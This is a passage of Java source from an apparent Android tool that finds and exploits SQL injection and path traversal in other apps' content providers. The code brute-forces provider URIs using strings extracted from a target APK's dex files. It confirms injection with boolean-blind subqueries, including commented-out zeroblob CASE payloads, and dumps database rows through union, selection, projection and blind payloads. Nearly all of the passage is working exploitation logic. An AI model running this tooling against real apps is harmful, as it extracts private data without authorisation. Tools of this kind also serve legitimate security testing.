                } else if (e.getMessage().contains("constraint failed")) {
                    // Means the query was valid and record update was attempted, but the value existed already and broke the UNIQUE constraint, return 1
                    return 1;
                } else {
                    handleUnexpectedTestException(e, builder.getVector(), builder.build());
                }
            }
        }

        return -1;
    }

    private boolean validateVector(CPVector vector, Payload payload) {
        boolean res;
        // Check to see if the vector/payload combo has already been validated
        String vectorPayloadMapKey = vector.hashCode() + ":" + payload.hashCode();
        if (vectorPayloadValidationMap.containsKey(vectorPayloadMapKey) && vectorPayloadValidationMap.get(vectorPayloadMapKey) != null) {
            return vectorPayloadValidationMap.get(vectorPayloadMapKey);
        }

        if (payload.getType() == BooleanBlindPayload.TYPE) {
            res = validateBooleanVector(vector, (BooleanBlindPayload) payload);
        } else {
            ArrayList<String[]> rows = dumpWithPayloadInternal(vector, payload, "SELECT sqlite_version()");
            res = !Util.nullOrEmpty(rows);
        }

        logInf(String.format("Validating vector: %s with payload: %s. Result: %s", vector, payload, res ? "Valid" : "Invalid"));

        // Store the validation result so its not repeated
        vectorPayloadValidationMap.put(vectorPayloadMapKey, res);
        return res;
    }

    private boolean validateBooleanVector(CPVector vector, BooleanBlindPayload payload) {
        if (vulnMap == null || vulnMap.size() == 0) {
            return false;
        }

        ProviderInfo pInfo = getProviderInfo(vector.getUri().getAuthority());
        boolean valid = false;
        if (vector.isQuery()) {
            // Try to read cols with query()
            CursorMeta readCursorMeta = getBooleanQuery(true, "", vector, payload, pInfo).getCursorMeta();
            // Cant do anything (unless I can figure out the CASE issue) with null or empty cursor
            if (!readCursorMeta.isNull()) {
                if (readCursorMeta.getNumRows() > 0) {
                    // Cursors should be non null and have different row counts (test ability to do arbitrary subqueries, android_metadata should *always* exist)
                    CursorMeta tCur = getBooleanQuery(true, payload.getOperator() + " (SELECT COUNT(*) FROM android_metadata) > 0", vector, payload, pInfo).getCursorMeta();
                    CursorMeta fCur = getBooleanQuery(true, payload.getOperator() + " (SELECT COUNT(*) FROM android_metadata) < 0", vector, payload, pInfo).getCursorMeta();
                    if (tCur != null && fCur != null) {
                        valid = (tCur.getNumRows() > 0 && fCur.getNumRows() == 0);
                    }
                } else {
                    //TODO: Fix CASE payloads
                    /* Dont bother returning as a valid vector + payload as it is basically unusable in its current form (limited to function calls, no sub-queries etc)
                    // Use zeroblob to trigger errors to use for bool true/false
                    String extraTrue = "(CASE WHEN 1 > 0 THEN (CASE WHEN (SELECT COUNT(*) FROM android_metadata) > 0 THEN zeroblob(999) ELSE zeroblob(999999999999)) ELSE zeroblob(999999999999) END)";
                    String extraFalse = "(CASE WHEN 1 > 0 THEN (CASE WHEN (SELECT COUNT(*) FROM android_metadata) < 0 THEN zeroblob(999) ELSE zeroblob(999999999999)) ELSE zeroblob(999999999999) END)";
                    BooleanBlindPayload.Builder plTrue = new BooleanBlindPayload.Builder(payload);
                    BooleanBlindPayload.Builder plFalse = new BooleanBlindPayload.Builder(payload);
                    plTrue.setCustomBody(extraTrue);
                    plFalse.setCustomBody(extraFalse);
                    tCur = getBooleanQuery(true, "", vector, plTrue, pInfo);
                    fCur = getBooleanQuery(true, "", vector, plFalse, pInfo);
                    if (tCur != null && fCur == null) {
                        valid = true;
                    }
                    */
                }
            }
        } else if (vector.isUpdate()) {
            // Check field is only updated on true conditions. ints should be >= 0 and have return vals of 1, 0 (test ability to do arbitrary subqueries, android_metadata should *always* exist)
            int tRes = getUpdateResult(true, payload.getOperator() + " (SELECT COUNT(*) FROM android_metadata) > 0", vector, payload, pInfo).getResult();
            int fRes = getUpdateResult(true, payload.getOperator() + " (SELECT COUNT(*) FROM android_metadata) < 0", vector, payload, pInfo).getResult();
            if (tRes > 0 && fRes == 0) {
                valid = true;
            }

            //TODO: Fix CASE payloads
            /* Dont bother returning as a valid vector + payload as it is basically unusable in its current form (limited to function calls, no sub-queries etc)
            if (!valid) {
                // Use zeroblob to trigger errors to use for bool true/false (error on false, true means first char of sqlite_version() is '3')
                tRes = getUpdateResult(true, payload.getOperator() + " (SELECT substr(sqlite_version(), 1, 1) AS chr WHERE 1=1 AND CASE WHEN 1=1 AND chr = '3' THEN zeroblob(999) ELSE zeroblob(999999999999) END)", vector, payload, pInfo);
                fRes = getUpdateResult(true, payload.getOperator() + " (SELECT substr(sqlite_version(), 1, 1) AS chr WHERE 1=1 AND CASE WHEN 1=2 AND chr = '3' THEN zeroblob(999) ELSE zeroblob(999999999999) END)", vector, payload, pInfo);
                if (tRes >= 0 && fRes == -1) {
                    valid = true;
                }
            }
            */
        }

        return valid;
    }

    public ArrayList<String[]> dumpWithPayload(CPVector vector, Payload payload, String sql) {
        int limit = 3;
        boolean gotTables = false;

        // Preserve the original option
        String origDumpTableOpt = getStringOption("dump_table");
        // Set limit to number of injection tables found (if > 0)
        ArrayList<String> injectionTables = getInjectionTables();
        if (injectionTables.size() > 0) {
            gotTables = true;
            limit = injectionTables.size();
        }

        // Check for LIMIT, save the num and strip it from the query
        Pattern matchLimitPattern = Pattern.compile("\\s+LIMIT\\s+(\\d+).*", Pattern.CASE_INSENSITIVE);
        Matcher matchLimitQuery = matchLimitPattern.matcher(sql);
        if (matchLimitQuery.find()) {
            try {
                // Set the option from the limit query limit
                int dumpLimit = Integer.parseInt(matchLimitQuery.group(1));
                setIntegerOption("dump_limit", dumpLimit);
                logInf("Setting dump row limit to: " + dumpLimit);
                // Strip the limit from the query
                sql = sql.replaceFirst("(?i)\\s+LIMIT\\s+(\\d+).*", "");
            } catch (NumberFormatException nfe) {
                logWarn("NumberFormatException setting dump limit: " + nfe.getMessage());
            }
        }

        // Check for ORDER BY, save the statement and dont strip it from the query
        Pattern matchOrderPattern = Pattern.compile("\\s+ORDER\\s+BY\\s([\\w\\s,-]+)$", Pattern.CASE_INSENSITIVE);
        Matcher matchOrderQuery = matchOrderPattern.matcher(sql);
        if (matchOrderQuery.find()) {
            // Set the option from the order by clause
            setStringOption("dump_order", matchOrderQuery.group(1));
            logInf("Saving ORDER BY clause as: " + matchOrderQuery.group(1));
        }

        ArrayList<String[]> rows = null;
        for (int i = 0; i < limit + 1; i++) {
            // First iteration, use original vector + payload
            if (i > 0) {
                CPExploit vectorPayload = getVectorAndPayloadForDumping(vulnMap);
                if (vectorPayload != null) {
                    payload = vectorPayload.getPayload();
                    vector = vectorPayload.getVector();
                } else {
                    logWarn("Couldnt find alternative vector and payload, using original");
                }
            }

            // Check for a wildcard query (i.e. SELECT * FROM <table>) - do in the loop in case we need a diff vector and payload to get fields
            Pattern matchWildcardPattern = Pattern.compile("SELECT\\s+\\*\\s+FROM\\s+([\\w-]+)\\s?", Pattern.CASE_INSENSITIVE);
            Matcher matchWildcardQuery = matchWildcardPattern.matcher(sql);
            if (matchWildcardQuery.find()) {
                // Wildcard query, find fields (only once, or until fields is not null and length > 0)
                String table = matchWildcardQuery.group(1);
                String[] fields = getFieldsFromCache(vector, table);
                if (fields == null || fields.length == 0) {
                    fields = getFieldsFromSqlCreate(vector, payload, table);
                }

                if (fields != null && fields.length > 0) {
                    logInf("Found " + fields.length + " fields for wildcard query");
                    StringBuilder allFields = new StringBuilder();
                    for (int j = 0; j < fields.length; j++) {
                        allFields.append(fields[j]);
                        if (j < (fields.length - 1)) {
                            allFields.append(", ");
                        }
                    }
                    sql = sql.replaceFirst("(?i)SELECT\\s+\\*\\s+FROM", "SELECT " + allFields.toString() + " FROM");
                    logInf("Query is now: " + sql);
                } else {
                    logWarn("Couldnt find any fields for wildcard query");
                }
            }

            rows = dumpWithPayloadInternal(vector, payload, sql);
            if (rows == null || rows.size() == 0) {
                if (gotTables && i < injectionTables.size()) {
                    // If it failed, and there are other tables to try, rotate through the found tables
                    String table = injectionTables.get(i);
                    logWarn("Rows null or empty when dumping, retrying with table: " + table);
                    setStringOption("dump_table", table);
                } else {
                    // Dont set the table
                    logWarn("Rows null or empty when dumping, retrying..");
                }
            } else {
                // Done!
                break;
            }
        }
        // Reset/clear the option
        if (origDumpTableOpt == null) {
            clearOption("dump_table");
        } else {
            setStringOption("dump_table", origDumpTableOpt);
        }
        return rows;
    }

    private ArrayList<String[]> dumpWithPayloadInternal(CPVector vector, Payload payload, String sql) {
        Cursor cur = null;
        try {
            if (vector.getType() == CPVector.PROJECTION && payload.getType() == ProjectionPayload.TYPE) {
                // Simple, just set projection to sql
                String[] sqlSplit = sql.trim().split(" ");
                if (sqlSplit.length > 1 && sqlSplit[0].equalsIgnoreCase("SELECT")) {
                    // Strip it
                    sql = sql.replace(sqlSplit[0], "");
                }
                ProjectionPayload.Builder projBuilder = new ProjectionPayload.Builder((ProjectionPayload) payload, vector);
                projBuilder.setField(sql);
                projBuilder.setTable(null);
                CPVector dumpPayloadVector = projBuilder.getRenderedVector();
                cur = query(dumpPayloadVector.getUri(), dumpPayloadVector.getProjection(), null, null, null);
                return getRows(cur);
            } else if (payload.getType() == UnionPayload.TYPE) {
                return getUnionRows(vector, (UnionPayload) payload, sql);
            } else if (payload.getType() == SelectionPayload.TYPE) {
                return getSelectionRows(vector, (SelectionPayload) payload, sql);
            } else if (payload.getType() == BooleanBlindPayload.TYPE) {
                return getBlindRows(vector, (BooleanBlindPayload) payload, sql);
            }
        } catch (Exception e) {
            if (e.getMessage() != null) {
                if (e.getMessage().contains("Cannot bind argument")) {
                    if (payload instanceof InjectionPayload && ((InjectionPayload) payload).getConditions().size() < DISCOVER_COLCOND_LIMIT) {
                        if (payload instanceof BooleanBlindPayload) {
                            BooleanBlindPayload.Builder boolBuilder = new BooleanBlindPayload.Builder((BooleanBlindPayload) payload, vector);
                            boolBuilder.addPlaceholderCondition();
                            logWarn("'Cannot bind argument' error returned for query, added condition/placeholder to payload, now: " + boolBuilder.build());
                            return dumpWithPayloadInternal(vector, boolBuilder.build(), sql);
                        } else if (payload instanceof UnionPayload) {
                            UnionPayload.Builder uniBuilder = new UnionPayload.Builder(((UnionPayload) payload), vector);
                            uniBuilder.addPlaceholderCondition();
                            logWarn("'Cannot bind argument' error returned for query, added condition/placeholder to payload, now: " + uniBuilder.build());
                            return dumpWithPayloadInternal(vector, uniBuilder.build(), sql);
                        }
                    } else {
                        logWarn("'Cannot bind argument' error returned but limit reached: " + DISCOVER_COLCOND_LIMIT);
                    }
                } else {
                    handleUnexpectedTestException(e, vector, payload);
                }
            }
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
        return null;
    }

    private Payload getPayloadOfType(CPVector vector, int pltype) {
        if (vulnMap != null && vulnMap.size() > 0 && vulnMap.containsKey(vector)) {
            if (getStringOption("dump_vector") != null && !vector.getTypeString().equalsIgnoreCase(getStringOption("dump_vector"))) {
                return null;
            }
            if (getStringOption("dump_table") != null && vector.getTable() != null && !vector.getTable().equalsIgnoreCase(getStringOption("dump_table"))) {
                return null;
            }

            LinkedHashSet<Payload> payloads = vulnMap.get(vector);
            for (Payload payload : payloads) {
                if (payload.getType() != pltype) {
                    continue;
                }
                if (getStringOption("dump_payload") != null && !payload.getTypeString().equalsIgnoreCase(getStringOption("dump_payload"))) {
                    continue;
                }

                switch (payload.getType()) {
                    case BooleanBlindPayload.TYPE:
                        if (((BooleanBlindPayload) payload).isSupportedVector(vector)) {
                            return payload;
                        }
                        break;
                    case UnionPayload.TYPE:
                        if (((UnionPayload) payload).isSupportedVector(vector)) {
                            return payload;
                        }
                        break;
                    case ProjectionPayload.TYPE:
                        if (((ProjectionPayload) payload).isSupportedVector(vector)) {
                            return payload;
                        }
                        break;
                    case SelectionPayload.TYPE:
                        if (((SelectionPayload) payload).isSupportedVector(vector)) {
                            return payload;
                        }
                        break;
                    case PathTraversalPayload.TYPE:
                        if (((PathTraversalPayload) payload).isSupportedVector(vector)) {
                            return payload;
                        }
                        break;
                    case HeuristicPayload.TYPE:
                        if (((HeuristicPayload) payload).isSupportedVector(vector)) {
                            return payload;
                        }
                        break;
                }
            }
        }
        return null;
    }

    public static HashSet<Uri> getProviderUrisFromPathPermissions(ProviderInfo providerInfo) {
        // For somee reason authority cn be null?
        if (providerInfo.authority == null) {
            return null;
        }

        String authority;
        if (providerInfo.authority.contains(";")) {
            String[] authSplit = providerInfo.authority.split(";");
            authority = authSplit[0];
        } else {
            authority = providerInfo.authority;
        }
        String base = "content://" + authority + "/";
        HashSet<String> paths = new HashSet<>();
        HashSet<Uri> uris = new HashSet<>();
        if (providerInfo.pathPermissions != null) {
            for (PathPermission pathPerm : providerInfo.pathPermissions) {
                String path = pathPerm.getPath();
                // Trim the leading slash
                if (path.indexOf('/') == 0) {
                    path = path.substring(1);
                }

                // Add words/paths from path permissions. Also deal with wildcards in path patterns
                // https://developer.android.com/guide/topics/manifest/path-permission-element
                if (!path.contains("*")) {
                    // No wildcard
                    paths.add(path);
                } else if (path.contains(".*")) {
                    // Wildcard type 1
                    paths.add(path.replace(".*", ""));
                    paths.add(path.replace(".*", "1"));
                } else if (path.contains("*")) {
                    // Wildcard type 2
                    paths.add(path.replace("*", ""));
                }
            }

            for (String path : paths) {
                // Normalise double slashes to single slashes
                if (path.contains("//")) {
                    path = path.replaceAll("//", "/");
                }
                uris.add(Uri.parse(base + path));
            }
        }
        return uris;
    }

    private ArrayList<CPVector> discover() {

        ArrayList<CPVector> dVectors = new ArrayList<>();
        if (targetPkg == null) {
            logErr("Target package has not been set, cannot continue");
            return null;
        }

        // Check for string binary
        stringsPath = getLocalBinaryPath("strings");
        if (stringsPath != null) {
            logInf("Found strings binary at: " + stringsPath);
        }

        // Get available providers based on current app context
        logInf("Finding injection vectors in package: " + targetPkg);
        ArrayList<ProviderInfo> providers = Util.getAvailableProviders(targetPkg.getTargetPkg(), context, getArrayListOption("providers"), getArrayListOption("skip"));
        if (!Util.nullOrEmpty(providers)) {
            logInf("Found " + providers.size() + " available providers:");
            for (ProviderInfo providerInfo : providers) {
                logInf(String.format("Name: %s, Read: %s, Write: %s", providerInfo.name, providerInfo.readPermission, providerInfo.writePermission));
            }
        } else {
            logInf("No available providers found for package");
            return null;
        }

        // Init dictionary
        oxfordDictionary = new OxfordDictionary(context);
        if (oxfordDictionary.isInitialised() && getBooleanOption("use_dictionary_filter")) {
            logInf("Dictionary filter will be used to refine brute force wordlist");
        }

        if (getIntegerOption("max_words") != null && getIntegerOption("max_words") >= 0) {
            CUSTOM_DISCOVER_BRUTE_WORD_LIMIT = getIntegerOption("max_words");
            logInf("Set custom discovery word limit to: " + CUSTOM_DISCOVER_BRUTE_WORD_LIMIT);
        }
        if (getIntegerOption("max_depth") != null && getIntegerOption("max_depth") > 0 && getIntegerOption("max_depth") <= 5) {
            CUSTOM_DISCOVER_BRUTE_PATH_DEPTH = getIntegerOption("max_depth");
            logInf("Set custom discovery path depth to: " + CUSTOM_DISCOVER_BRUTE_PATH_DEPTH);
        }

        // Init ThreadPoolExecutor for the callables
        BlockingQueue<Runnable> blockingQueue = new ArrayBlockingQueue<>(50);
        ThreadPoolExecutor executor = new ThreadPoolExecutor(10, 10, 1000, TimeUnit.MILLISECONDS, blockingQueue, new ThreadPoolExecutor.CallerRunsPolicy());

        // If strings binary exists, extract APK and read strings from .dex files
        Set<String> apkWords = new HashSet<>();
        if (stringsPath != null) {
            boolean apkCopy = false;
            boolean customApk = false;
            File tempApk;
            try {
                if (getStringOption("apk_path") == null || !new File(getStringOption("apk_path")).exists()) {
                    // Attempt to copy and analyse the APK for content Uris
                    tempApk = getTempFile(context, targetPkg.getTargetPkg() + "_apk.apk");
                    if (tempApk != null) {
                        apkCopy = Util.copyFile(providers.get(0).applicationInfo.sourceDir, tempApk.getAbsolutePath());
                        if (apkCopy) {
                            logInf("Successfully copied target APK");
                        } else {
                            logWarn("Failed to copy target APK");
                        }
                    }
                } else {
                    apkCopy = true;
                    customApk = true;
                    String customApkPath = getStringOption("apk_path");
                    logInf("Using custom apk path: " + customApkPath);
                    tempApk = new File(customApkPath);
                }

                if (apkCopy) {
                    // Attempt to open the APK and read strings from it
                    List<DexFileStringSearchCallable> callList = new ArrayList<>();
                    ZipFile apkZip = new ZipFile(tempApk);
                    Enumeration<? extends ZipEntry> entries = apkZip.entries();
                    while (entries.hasMoreElements()) {
                        ZipEntry entry = entries.nextElement();
                        String entryName = entry.getName();
                        if (entryName.endsWith(".dex")) {
                            if (entryName.contains("/")) {
                                // Convert slashes to dashes if its a path (cba to mess around making subdirs in the cache folder..)
                                entryName = entryName.replace("/", "-");
                                if (entryName.startsWith("-")) {
                                    entryName = entryName.substring(1);
                                }
                            }
                            // Copy to cache
                            File dexCache = getTempFile(context, targetPkg.getTargetPkg() + "_" + entryName);
                            byte[] entryBytes = getZipFileBytes(apkZip, entry);
                            boolean copy = Util.copyBytesToFile(entryBytes, dexCache);
                            if (copy) {
                                callList.add(new DexFileStringSearchCallable(dexCache));
                            } else {
                                logWarn("Failed to copy dex file: " + entryName);
                            }
                        }
                    }

                    if (callList.size() == 0) {
                        logWarn("No dex files found in target APK");
                    } else {
                        logInf(callList.size() + " dex files found in target APK");

                        try {
                            logInf("Queuing " + callList.size() + " thread(s) to extract strings from dex files");
                            // invokeAll() should block until all are complete, or timeout after 15 mins
                            List<Future<Set<String>>> futures = executor.invokeAll(callList, 15, TimeUnit.MINUTES);

                            // Threads have finished
                            logInf("String extraction threads have finished");
                            for (Future<Set<String>> future : futures) {
                                try {
                                    Set<String> res = future.get();
                                    if (res != null) {
                                        apkWords.addAll(res);
                                    }
                                } catch (ExecutionException ee) {
                                    logErr("ExecutionException: " + ee.getMessage());
                                } catch (CancellationException ce) {
                                    logErr("CancellationException: " + ce.getMessage());
                                }
                            }

                            // Delete the dex files
                            for (DexFileStringSearchCallable callable : callList) {
                                Util.deleteFile(callable.dexFile);
                                logInf("Finished extracting strings, deleted file: " + callable.dexFile.getAbsolutePath());
                            }

                        } catch (InterruptedException ie) {
                            logErr("InterruptedException: " + ie.getMessage());
                        }
                    }
                    if (!customApk) {
                        Util.deleteFile(tempApk);
                    }
                }
            } catch (Exception e) {
                logErr("Exception extracting strings from target APK: " + e.getMessage());
            }
        } else {
            logWarn("Missing local strings binary, cannot extract strings from DEX");
        }

        PackageInfo pkgInfo = null;
        Set<String> appWords = new HashSet<>();
        HashSet<Uri> urisDiscoveredToAdd = new HashSet<>();
        try {
            pkgInfo = context.getPackageManager().getPackageInfo(targetPkg.getTargetPkg(), PackageManager.GET_ACTIVITIES|PackageManager.GET_PROVIDERS|PackageManager.GET_RECEIVERS|PackageManager.GET_SERVICES);
        } catch (PackageManager.NameNotFoundException nnfe) {
            logErr("NameNotFoundException: " + nnfe.getMessage());
            return null;
        } catch (RuntimeException re) {
            logErr("RuntimeException: " + re.getMessage());
            try {
                // Try once more with no flags
                pkgInfo = context.getPackageManager().getPackageInfo(targetPkg.getTargetPkg(), 0);
            } catch (PackageManager.NameNotFoundException nnfe) {
                return null;
            } catch (RuntimeException re2) {}
        }

        if (pkgInfo != null) {
            // Generate words from app resources
            if (pkgInfo.activities != null) {
                for (ActivityInfo activityInfo : pkgInfo.activities) {
                    appWords.addAll(mangleResource(activityInfo, RES_ACTIVITY));
                }
            }
            if (pkgInfo.providers != null) {
                for (ProviderInfo providerInfo : pkgInfo.providers) {
                    appWords.addAll(mangleResource(providerInfo, RES_PROVIDER));
                    // Add URUs from path permissions
                    HashSet<Uri> uris = getProviderUrisFromPathPermissions(providerInfo);
                    if (uris != null && uris.size() > 0) {
                        logInf("Adding URIs discovered from path permissions for provider: " + providerInfo.name);
                        urisDiscoveredToAdd.addAll(uris);
                    }
                }
            }
            if (pkgInfo.receivers != null) {
                for (ActivityInfo receiverInfo : pkgInfo.receivers) {
                    appWords.addAll(mangleResource(receiverInfo, RES_RECEIVER));
                }
            }
            if (pkgInfo.services != null) {
                for (ServiceInfo serviceInfo : pkgInfo.services) {
                    appWords.addAll(mangleResource(serviceInfo, RES_SERVICE));
                }
            }
        }

        if (apkWords.size() > getMaxWords(providers.size())) {
            // Too many strings found in APK binary
            logWarn("Limiting APK strings to " + getMaxWords(providers.size()));
            apkWords = Util.getRandomSet(apkWords, getMaxWords(providers.size()));
        }

        // Add the already discovered URIs from the binary
        if (urisDiscovered.size() > 0) {
            logInf("Adding URIs discovered from the APK binary");
            Set<Uri> pkgMetaUris = Util.getDiscoveredUrisForPkg(context, targetPkg.getTargetPkg());
            HashSet<Uri> metaUris = Util.getDiscoveredUrisOnly(context);
            for (Uri dUri : urisDiscovered) {
                // Check the uri is associated with the current package
                String assocPkg = null;
                if (pkgMetaUris.contains(dUri)) {
                    // Already associated in shared prefs/metadata
                    assocPkg = targetPkg.getTargetPkg();
                } else if (metaUris.contains(dUri)) {
                    // Already associated in shared prefs/metadata with another package
                    continue;
                } else if (!metaUris.contains(dUri)) {
                    // Unknown, lookup by authority
                    assocPkg = Util.getPackageNameByAuthority(dUri.getAuthority(), context);
                }

                if (assocPkg == null) {
                    logWarn("Skipping URI (" + dUri + ") as associated package is null");
                    continue;
                } else {
                    // Add the uri to shared prefs for the associated pkg
                    Util.addDiscoveredUriForPkg(context, assocPkg, dUri.toString());
                    if (!assocPkg.equalsIgnoreCase(targetPkg.getTargetPkg())) {
                        logWarn("Skipping URI (" + dUri + ") that isnt a component of the target package: " + targetPkg.getTargetPkg() + ", as it is a component of: " + assocPkg);
                        continue;
                    }
                }
                urisDiscoveredToAdd.add(dUri);
            }
        }

        // Add URIs from shared prefs (discovered from other packages)
        HashSet<Uri> sharedPrefUris = (HashSet<Uri>) Util.getDiscoveredUrisForPkg(context, targetPkg.getTargetPkg());
        if (sharedPrefUris.size() > 0) {
            logInf("Adding URIs discovered from other package scans");
            urisDiscoveredToAdd.addAll(sharedPrefUris);
        }

        // If the existing report uris have been set in the options, generate and add the vectors from them
        if (getArrayListOption("report_uris") != null && targetPkg != null) {
            ArrayList<String> existingUris = getArrayListOption("report_uris");
            HashSet<CPVector> genVectors = new HashSet<>();
            for (String uri : existingUris) {
                String uriPkg = Util.getPackageNameByAuthority(Uri.parse(uri).getAuthority(), context);
                if (uriPkg != null && uriPkg.equals(targetPkg.getTargetPkg())) {
                    genVectors.addAll(CPVector.getVectorsFromUri(uri));
                }
            }
            logInf("Adding " + genVectors.size() + " vectors from the existing report");
            dVectors.addAll(genVectors);
        }

        for (Uri uriToAdd : urisDiscoveredToAdd) {
            logInf("Generating vector(s) for Uri: " + uriToAdd);
            ArrayList<CPVector> genVectors = CPVector.getVectorsFromUri(uriToAdd.toString());
            if (genVectors != null && genVectors.size() > 0) {
                logInf("Got " + genVectors.size() + " vectors for Uri: " + uriToAdd);
                dVectors.addAll(genVectors);
            }
        }

        // For each of the providers, build a list of content URIs
        Set<String> wordList = getBruteForceWordlist(appWords, apkWords);
        for (ProviderInfo pInfo : providers) {
            logInf("Finding content URIs for provider: " + pInfo.name);
            Map<Uri, String[]> contUris = getProviderUris(pInfo, wordList);
            if (contUris != null && contUris.size() > 0) {
                // Spider found uris
                Set<Uri> uriSet = new HashSet<>(contUris.keySet());
                Set<Uri> spiderUris = spiderFoundUris(contUris, wordList, executor);
                uriSet.addAll(spiderUris);
                for (Uri uri : uriSet) {
                    logInf("Generating vector(s) for Uri: " + uri);
                    ArrayList<CPVector> genVectors = CPVector.getVectorsFromUri(uri.toString());
                    if (genVectors != null && genVectors.size() > 0) {
                        logInf("Got " + genVectors.size() + " vectors for Uri: " + uri);
                        dVectors.addAll(genVectors);
                    }
                }
            }
        }

        // Shutdown the brute force exec service
        executor.shutdown();

        return dVectors;
    }

    private ArrayList<String> getArrayListOption(String key) {
        if (options != null && options.containsKey(key)) {
            return options.getStringArrayList(key);
        }
        return null;
    }

    private void setArrayListOption(String key, ArrayList<String> val) {
        if (options == null) {
            options = new Bundle();
        }
        options.putStringArrayList(key, val);
    }

    private String getStringOption(String key) {
        if (options != null && options.containsKey(key)) {
            return options.getString(key);
        }
        return null;
    }

    private void setStringOption(String key, String val) {
        if (options == null) {
            options = new Bundle();
        }
        options.putString(key, val);
    }

    private Integer getIntegerOption(String key) {
        if (options != null && options.containsKey(key)) {
            return options.getInt(key);
        }
        return null;
    }

    private void setIntegerOption(String key, Integer val) {
        if (options == null) {
            options = new Bundle();
        }
        options.putInt(key, val);
    }

    private boolean getBooleanOption(String key) {
        if (options != null && options.containsKey(key)) {
            return options.getBoolean(key);
        }
        return false;
    }

    private void setBooleanOption(String key, boolean val) {
        if (options == null) {
            options = new Bundle();
        }
        options.putBoolean(key, val);
    }

    private void clearOption(String key) {
        if (options != null && options.containsKey(key)) {
            options.remove(key);
        }
    }

    private Set<String> filterStringsFromDex(ArrayList<String> dexStrings) {
        Set<String> filterStrings = new HashSet<>();
        Pattern p1 = Pattern.compile("(([A-Za-z/_ -]\\w+)+)");
        for (String inStr : dexStrings) {

            // Check for full content URI's first
            Matcher mUri = fullContentUriRegex.matcher(inStr);
            while (mUri.find()) {
                String match = mUri.group(1);
                if (!urisDiscovered.contains(match)) {
                    Uri foundUri = Uri.parse(match);
                    // If the authority contains invalid chars ie format placeholders skip it
                    if (foundUri.getAuthority() == null || foundUri.getAuthority().contains("%")) {
                        logWarn("Skipping URI with invalid authority: " + foundUri);
                        continue;
                    }
                    // Only add the full uri if it has at least one path segment
                    if (foundUri.getPathSegments().size() > 0) {
                        logInf("Found full Content Provider URI: " + foundUri);
                        urisDiscovered.add(foundUri);
                    } else {
                        logWarn("Skipping URI with no path segments: " + foundUri);
                    }
                    // Only add ids to non-file Uris (without file ext length 1-4 chars)
                    if (!match.matches(".+/.+\\.\\w{1,4}$")) {
                        // If uri has a path that ends in a trailing slash, add an id to the uri
                        if (foundUri.getPathSegments().size() > 0 && foundUri.getPath().endsWith("/")) {
                            Uri matchWithId = foundUri.buildUpon().appendPath("1").build();
                            logInf("Appending id to found URI: " + matchWithId);
                            urisDiscovered.add(matchWithId);
                        } else if (foundUri.getPathSegments().size() > 0 && !foundUri.getPath().endsWith("/") && !foundUri.getPath().matches(".*/\\d+$")) {
                            Uri matchWithSlashAndId = foundUri.buildUpon().appendPath("1").build();
                            logInf("Appending slash and id to found URI: " + matchWithSlashAndId);
                            urisDiscovered.add(matchWithSlashAndId);
                        }
                    }
                }
            }

            inStr = inStr.trim();
            Matcher m = p1.matcher(inStr);
            while (m.find()) {
                String match = m.group(1);
                if (!match.contains(" ")) {
                    addSubWords(filterStrings, match);
                } else if (match.contains("/")) {
                    // Split on /
                    for (String slashSplit : match.split("/")) {
                        addSubWords(filterStrings, slashSplit);
                    }
                } else if (match.contains(" ")) {
                    // Split on space
                    for (String spaceSplit : match.split(" ")) {
                        addSubWords(filterStrings, spaceSplit);
                    }
                }  else if (match.contains("_")) {
                    // Split on underscore
                    for (String underSplit : match.split("_")) {
                        addSubWords(filterStrings, underSplit);
                    }
                }  else if (match.contains("-")) {
                    // Split on dash
                    for (String dashSplit : match.split("-")) {
                        addSubWords(filterStrings, dashSplit);
                    }
                }
            }
        }

        if (!getBooleanOption("use_dictionary_filter") || oxfordDictionary == null) {
            return filterStrings;
        } else {
            Set<String> dictFilterStrings = new HashSet<>();
            for (String filteredString : filterStrings) {
                if (oxfordDictionary.contains(filteredString)) {
                    dictFilterStrings.add(filteredString);
                }
            }
            return dictFilterStrings;
        }
    }

    public static Bundle getDefaultBundle() {
        Bundle opts = new Bundle();
        opts.putBoolean("no_duplicate_vectors", true);
        opts.putBoolean("use_dictionary_filter", true);
        opts.putBoolean("heuristic_detection", true);
        opts.putBoolean("blind_detection", true);
        opts.putBoolean("no_cache", false);
        return opts;
    }

    private void addSubWords(Set<String> list, String in) {
        // Ignore words with spaces
        if (in.contains(" ")) {
            return;
        }

        String[] subWords = Util.camelCaseToArray(in);
        if (in.length() >= 4) {
            list.add(in);
        }
        if (subWords.length > 1) {
            for (String subWord : subWords) {
                if (subWord.length() >= 4) {
                    list.add(subWord);
                }
            }
        }
    }

    private boolean saveVectors(CPReportTarget reportTarget, Map<CPVector, LinkedHashSet<Payload>> vulnMap, String sqliteVer) {
        boolean status = false;
        try {
            CPReport cpReport = getReportFromMap(reportTarget, vulnMap, sqliteVer);
            if (cpReport != null) {
                status = Util.saveReport(context, cpReport);
            }
        } catch (Exception e) {
            logWarn("Exception saving discovered vectors: " + e.getMessage());
        }
        return status;
    }

    private CPReport getReportFromMap(CPReportTarget reportTarget, Map<CPVector, LinkedHashSet<Payload>> vulnMap, String sqliteVer) {
        LinkedHashSet<CPExploit> items = new LinkedHashSet<>();
        // Make a report item object for each vector
        for (CPVector vector : vulnMap.keySet()) {
            items.add(new CPExploit(vector, vulnMap.get(vector)));
        }
        if (items.size() > 0) {
            return new CPReport(reportTarget, items, sqliteVer);
        }
        return null;
    }

    private Map<CPVector, LinkedHashSet<Payload>> loadVectors(CPReport report) {
        try {
            Map<CPVector, LinkedHashSet<Payload>> vulnMap = new HashMap<>();
            for (CPExploit item : report.getItems()) {
                CPVector plVector = item.getVector();
                if (!vulnMap.containsKey(plVector)) {
                    vulnMap.put(plVector, new LinkedHashSet<Payload>());
                }
                vulnMap.get(plVector).addAll(item.getPayloads());
            }
            return vulnMap;
        } catch (Exception e) {
            logWarn("Exception loading report: " + e.getMessage());
            // Delete the cached file if present
            removeCachedVectors(report.getTarget());
        }
        return null;
    }

    private Map<CPVector, LinkedHashSet<Payload>> loadVectors(CPReportTarget reportTarget) {
        File cacheFile = new File(Util.getReportPath(context, reportTarget.getTargetPkg(), reportTarget.getVersion()));
        if (!cacheFile.exists()) {
            return null;
        }
        CPReport cpReport = Util.loadReport(cacheFile);
        if (cpReport != null) {
            return loadVectors(cpReport);
        }
        return null;
    }

    private boolean removeCachedVectors(CPReportTarget reportTarget) {
        boolean status = false;
        File cacheFile = new File(Util.getReportPath(context, reportTarget.getTargetPkg(), reportTarget.getVersion()));
        if (cacheFile.exists()) {
            try {
                status = cacheFile.delete();
            } catch (Exception de) {
